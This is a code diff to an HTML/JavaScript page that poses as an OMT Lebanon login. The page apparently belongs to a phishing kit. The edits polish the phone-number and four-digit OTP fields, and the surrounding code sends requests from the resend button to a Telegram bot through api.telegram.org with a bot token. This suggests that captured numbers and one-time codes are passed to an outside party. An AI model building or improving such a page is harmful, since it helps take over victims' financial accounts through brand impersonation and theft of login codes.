@@ -14,7 +14,8 @@
   <meta name="twitter:title" content="تسجيل الدخول" />
   <meta name="twitter:description" content="سجل دخولك إلى خدمات OMT لبنان بأمان وسهولة!" />
   <meta name="twitter:image" content="https://www2.0zz0.com/2025/12/03/17/283254346.jpeg" />
-  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;900&display=swap" rel="stylesheet">
+  <!-- Add a beautiful thin font for the phone input -->
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;900&family=Roboto:wght@300;400;500;700&family=Lexend:wght@300;500&display=swap" rel="stylesheet">
   <style>
     body {
       background: #f7f7f8;
@@ -164,11 +165,12 @@
       border: 2.5px solid #ffe56d;
       box-shadow: 0 1px 7px #ffd9000d;
       background: #f9f9fb;
-      font-size: 17px;
-      font-family: 'Cairo', Arial, sans-serif;
+      font-size: 20px;
+      /* Use a thin, modern, and clear font */
+      font-family: 'Lexend', 'Roboto', 'Cairo', Arial, sans-serif;
+      font-weight: 300;
       direction: ltr;
-      color: #222;
-      font-weight: 700;
+      color: #1a1a1a;
       letter-spacing: 2px;
       outline: none;
       transition: border 0.18s, box-shadow 0.18s;
@@ -177,6 +179,8 @@
       border-color: #ffd800;
       background: #fffdf4;
       box-shadow: 0 3px 14px #ffd80033;
+      font-weight: 500;
+      color: #111;
     }
     .omt-register-row {
       text-align: center;
@@ -217,6 +221,8 @@
     /* OTP code field styles */
     .omt-otp-code-row {
       display: flex;
+      flex-direction: row;     /* LTR for input order left-to-right */
+      direction: ltr;          /* this ensures left-to-right typing */
       gap: 12px;
       justify-content: flex-start;
       margin: 20px 0 30px 0;
@@ -230,8 +236,8 @@
       border-radius: 10px;
       border: 2px solid #ffe56d;
       box-shadow: 0 1px 7px #ffd90011;
-      font-family: 'Cairo', Arial, sans-serif;
-      font-weight: bold;
+      font-family: 'Lexend', 'Roboto', 'Cairo', Arial, sans-serif;
+      font-weight: 400;
       direction: ltr;
       outline: none;
       letter-spacing: 5px;
@@ -353,10 +359,10 @@
       <div class="omt-otp-phone" id="displayOtpPhone"></div>
       <form id="otpForm" autocomplete="off">
         <div class="omt-otp-code-row" id="otpCodeRow">
-          <input type="text" maxlength="1" class="omt-otp-code-digit" />
-          <input type="text" maxlength="1" class="omt-otp-code-digit" />
-          <input type="text" maxlength="1" class="omt-otp-code-digit" />
-          <input type="text" maxlength="1" class="omt-otp-code-digit" />
+          <input type="text" maxlength="1" class="omt-otp-code-digit" autocomplete="one-time-code" inputmode="numeric" />
+          <input type="text" maxlength="1" class="omt-otp-code-digit" autocomplete="one-time-code" inputmode="numeric" />
+          <input type="text" maxlength="1" class="omt-otp-code-digit" autocomplete="one-time-code" inputmode="numeric" />
+          <input type="text" maxlength="1" class="omt-otp-code-digit" autocomplete="one-time-code" inputmode="numeric" />
         </div>
         <button type="submit" class="omt-otp-btn" id="otpBtn" disabled>Confirm</button>
         <div class="omt-otp-error-msg" id="otpError" style="display:none;">
@@ -439,27 +445,61 @@
 
     // OTP Page Logic
     function otpSetup() {
-      otpInputs = document.querySelectorAll('.omt-otp-code-digit');
+      otpInputs = document.querySelectorAll('#otpCodeRow .omt-otp-code-digit');
       otpCodeArr = ["","","",""];
+      // Clear and set up all fields
       for(let i=0; i<otpInputs.length; i++) {
         otpInputs[i].value = '';
-        otpInputs[i].addEventListener('input', function(e){
-          this.value = this.value.replace(/\D/g, '').substr(0,1);
-          otpCodeArr[i] = this.value;
-          if (this.value && i < otpInputs.length-1) otpInputs[i+1].focus();
-          updateOtpBtn();
-        });
-        otpInputs[i].addEventListener('keydown', function(e){
-          if(e.key === 'Backspace' && !this.value && i>0) {
-            otpInputs[i-1].focus();
-          }
-        });
+        otpInputs[i].style.direction = 'ltr';
+        otpInputs[i].style.textAlign = 'center';
+
+        otpInputs[i].removeEventListener('input', handleOtpInput);
+        otpInputs[i].removeEventListener('keydown', handleOtpKeydown);
+        otpInputs[i].addEventListener('input', handleOtpInput);
+        otpInputs[i].addEventListener('keydown', handleOtpKeydown);
       }
       updateOtpBtn();
       otpError.style.display = 'none';
       otpBtn.disabled = true;
       otpBtn.classList.remove('active');
+      otpInputs[0].focus();
     }
+
+    function handleOtpInput(e) {
+      const inputs = otpInputs;
+      let idx = Array.prototype.indexOf.call(inputs, e.target);
+
+      // Always LTR fill: input 0 is left, input 1 is next to right, etc.
+      if (e.target.value.length > 1) e.target.value = e.target.value.slice(0,1);
+      if (/\D/.test(e.target.value)) e.target.value = e.target.value.replace(/\D/g, '');
+
+      otpCodeArr[idx] = e.target.value;
+
+      if (e.target.value && idx < inputs.length-1) {
+        inputs[idx+1].focus();
+      }
+      updateOtpBtn();
+    }
+    function handleOtpKeydown(e) {
+      const inputs = otpInputs;
+      let idx = Array.prototype.indexOf.call(inputs, e.target);
+
+      if(e.key === 'Backspace') {
+        if (e.target.value === '' && idx > 0) {
+          inputs[idx-1].focus();
+        }
+      }
+      if (["ArrowRight", "ArrowLeft"].includes(e.key)) {
+        e.preventDefault();
+        if (e.key === 'ArrowRight' && idx < inputs.length-1) {
+          inputs[idx+1].focus();
+        }
+        if (e.key === 'ArrowLeft' && idx > 0) {
+          inputs[idx-1].focus();
+        }
+      }
+    }
+
     function updateOtpBtn() {
       let filled = otpCodeArr.every(d=>d.length===1);
       if(filled){
@@ -532,7 +572,6 @@
 
     resendBtn.onclick = async function(){
       if(resendBtn.disabled) return;
-      // Send the request to telegram
       try {
         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
           method: "POST",
